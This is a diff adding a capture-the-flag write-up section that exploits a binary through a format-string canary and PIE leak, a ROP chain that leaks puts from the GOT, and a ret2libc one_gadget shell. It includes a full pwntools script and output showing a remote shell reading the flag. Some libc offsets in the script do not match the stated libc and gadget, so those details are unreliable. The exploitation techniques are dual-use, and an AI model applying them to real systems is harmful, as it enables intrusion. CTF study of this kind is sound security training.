@@ -96,4 +96,256 @@ It's a tell-tale sign of a format string vulnerability, we just need to input a 
 The flag is : ``` GLUG{https://bit.ly/3vPXAuD} ```
 
 
+## **Warmup**
+
+### Description
+> Can you help find the canary?
+
+We only have binary file attached
+
+### Solution
+Let's run `checksec` on the file:
+
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
+└─$ checksec chall
+[*] '/home/kali/Desktop/pwn/foobar_ctf/chall'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+That's a lot of protection. Using ghidra we can decompile the binary:
+
+```c
+void vuln(void)
+
+{
+  long in_FS_OFFSET;
+  char local_98 [64];
+  char local_58 [72];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  puts("Can you help find the Canary ?");
+  fgets(local_98,0x40,stdin);
+  printf(local_98);
+  fflush(stdout);
+  gets(local_58);
+  puts(local_58);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
+We can see that there is a format string vulnerability with:
+```c
+  printf(local_98);
+```
+That means we have the ability to read memory and arbitrary write. With that in mind, we can definitely leak the canary value and then buffer-overflow the `local_58` array bypassing the `__stack_chk_fail()`. We can defeat the stack canary  
+
+```assembly
+0x0000555555555218 <+15>:    mov    rax,QWORD PTR fs:0x28
+0x0000555555555221 <+24>:    mov    QWORD PTR [rbp-0x8],rax
+```
+The canary was stored at `rbp-0x8`
+
+```
+gef➤  x/20gx $rsp
+0x7fffffffde60: 0x4141414141414141      0x000a414141414141
+0x7fffffffde70: 0x0000000000000040      0x00007ffff7fa76c0
+0x7fffffffde80: 0x0000000000000000      0x00007ffff7e5a1e1
+0x7fffffffde90: 0x0000000000000000      0x00007ffff7fa76c0
+0x7fffffffdea0: 0x0000000000000000      0x0000000000000000
+0x7fffffffdeb0: 0x00007ffff7fa84a0      0x00007ffff7e56d39
+0x7fffffffdec0: 0x00007ffff7fa76c0      0x00007ffff7e4e5ed
+0x7fffffffded0: 0x00005555555552e0      0x00007fffffffdf00
+0x7fffffffdee0: 0x0000555555555120      0x7636f604229da000
+0x7fffffffdef0: 0x00007fffffffdf00      0x00005555555552d5
+gef➤  p $rbp-0x8
+$1 = (void *) 0x7fffffffdee8
+gef➤  x/gx $rbp -0x8
+0x7fffffffdee8: 0x7636f604229da000
+```
+Testing a few times, i found out the offset of stack canary was at `"%23$llx"`  
+We can then leak the canary and buffer-overflow the return address but where do we return into? Remember that PIE and NX enabled  
+My general attack was to leak `puts libc address` from the `GOT table` and then ret2libc. But in order to do that we need 3 things: `puts@plt` address, `puts@got.plt` address and a `ROP-Gadget` to prepare our `rdi` register before calling into `puts@plt`  
+Because PIE was enabled we need to leak an address in the program and calculate with the offset to figure out those addresses we need. We will take advantage of this:
+```
+0x7fffffffded0: 0x00005555555552e0      0x00007fffffffdf00
+0x7fffffffdee0: 0x0000555555555120      0x7636f604229da000
+```
+```
+gef➤  x/2i 0x00005555555552e0
+   0x5555555552e0 <__libc_csu_init>:    endbr64 
+   0x5555555552e4 <__libc_csu_init+4>:  push   r15
+```
+We will leak the address of `__libc_csu_init` with the offset of `"%20$llx"` using format strings vulnerability  
+We then use `ROPgadget` to find `pop rdi, ret`:
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
+└─$ ROPgadget --binary chall | grep "rdi"
+0x000000000000100b : fldcw word ptr [rdi] ; add byte ptr [rax], al ; test rax, rax ; je 0x1016 ; call rax
+0x0000000000001343 : pop rdi ; ret
+```
+We have these offsets to calculate:
+```
+0x1343 : pop rdi ; ret
+0x12a5 <main+0>:     endbr64
+0x10b0 <puts@plt>:   endbr64
+0x3fa0 <puts@got.plt>:  0x0000000000001030
+```
+```
+base_prog = init_addr - 0x12e0
+puts_got = base_prog + 0x3fa0
+puts_plt = base_prog + 0x10b0
+main_addr = base_prog + 0x12a5
+pop_rdi = base_prog + 0x1343
+```
+Now we build our payloads:
+```
+first_payload = "%23$llx%20$llx"
+second_payload = "A"*72 + p64(canary) + p64(0x0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+```
+With leaked puts libc address we can get the libc of the program using libc-database which was `libc6_2.23-0ubuntu11.2_amd64.so`  
+Then we use `one_gadget`:
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
+└─$ one_gadget libc6_2.23-0ubuntu11.2_amd64.so
+0x45226 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+```
+Now we have everything to build our final payload  
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+LOCAL = False
+REMOTE = True
+
+if REMOTE:
+	p = remote('chall.nitdgplug.org',30091)
+if LOCAL:
+	p = process('./chall')
+
+# ---LEAK THE CANARY AND INIT_ADDR---
+first_payload = "%23$llx%20$llx"
+p.sendlineafter("Can you help find the Canary ?\n",first_payload)
+canary = long(p.recv(16),16)
+init_addr = long(p.recv(16),16)
+
+# ---CALCULATE ADDR WITH OFFSET---
+base_prog = init_addr - 0x12e0
+puts_got = base_prog + 0x3fa0
+puts_plt = base_prog + 0x10b0
+main_addr = base_prog + 0x12a5
+pop_rdi = base_prog + 0x1343
+
+# ---BUFFER OVERFLOW PAYLOAD---
+sec_payload = "A"*72 + p64(canary) + p64(0x0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+p.sendline(sec_payload)
+p.recv(0x48)
+temp = p.recv(8)
+s1 = ""
+for x in temp:
+	if ( x != "\n"):
+		s1 += x
+s1 = s1 + chr(0) + chr(0)
+puts_libc = u64(s1)
+
+# ---CALCULATE LIBC BASE ADDRESS---
+log.info("Puts Libc Address: " + hex(puts_libc))
+libc_base = puts_libc - 0x84450
+one_gadget = libc_base + 0xe3b31
+
+p.sendlineafter("Can you help find the Canary ?\n","%23$llx")
+canary = long(p.recv(16),16)
+
+# ---RET2LIBC---
+payload = "A"*72 + p64(canary) + p64(0x0) + p64(one_gadget)
+p.sendline(payload)
+p.interactive()
+```
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
+└─$ python2 solve.py                          
+[+] Opening connection to chall.nitdgplug.org on port 30091: Done
+[DEBUG] Received 0x1e bytes:
+    'Can you help find the Canary ?'
+[DEBUG] Received 0x1 bytes:
+    '\n'
+[DEBUG] Sent 0xf bytes:
+    '%23$llx%20$llx\n'
+[DEBUG] Received 0x1d bytes:
+    '83464ac6a13fb60055f794b212e0\n'
+[DEBUG] Sent 0x79 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000040  41 41 41 41  41 41 41 41  00 b6 3f a1  c6 4a 46 83  │AAAA│AAAA│··?·│·JF·│
+    00000050  00 00 00 00  00 00 00 00  43 13 b2 94  f7 55 00 00  │····│····│C···│·U··│
+    00000060  a0 3f b2 94  f7 55 00 00  b0 10 b2 94  f7 55 00 00  │·?··│·U··│····│·U··│
+    00000070  a5 12 b2 94  f7 55 00 00  0a                        │····│·U··│·│
+    00000079
+[DEBUG] Received 0x48 bytes:
+    'A' * 0x48
+[DEBUG] Received 0x27 bytes:
+    00000000  0a 50 a4 fb  92 b2 7f 0a  43 61 6e 20  79 6f 75 20  │·P··│····│Can │you │
+    00000010  68 65 6c 70  20 66 69 6e  64 20 74 68  65 20 43 61  │help│ fin│d th│e Ca│
+    00000020  6e 61 72 79  20 3f 0a                               │nary│ ?·│
+    00000027
+[*] Puts Libc Address: 0x7fb292fba450
+[DEBUG] Sent 0x8 bytes:
+    '%23$llx\n'
+[DEBUG] Received 0x11 bytes:
+    '83464ac6a13fb600\n'
+[DEBUG] Sent 0x61 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000040  41 41 41 41  41 41 41 41  00 b6 3f a1  c6 4a 46 83  │AAAA│AAAA│··?·│·JF·│
+    00000050  00 00 00 00  00 00 00 00  31 9b 01 93  b2 7f 00 00  │····│····│1···│····│
+    00000060  0a                                                  │·│
+    00000061
+[*] Switching to interactive mode
+
+[DEBUG] Received 0x48 bytes:
+    'A' * 0x48
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[DEBUG] Received 0x1 bytes:
+    '\n'
+
+$ whoami
+[DEBUG] Sent 0x7 bytes:
+    'whoami\n'
+[DEBUG] Received 0x6 bytes:
+    'error\n'
+error
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0xf bytes:
+    'chall\n'
+    'flag.txt\n'
+chall
+flag.txt
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    'cat flag.txt\n'
+[DEBUG] Received 0x38 bytes:
+    "GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}"
+GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}$
+```
+
+The flag is: `GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}`
+
+
+
+
+
+
+
+
 
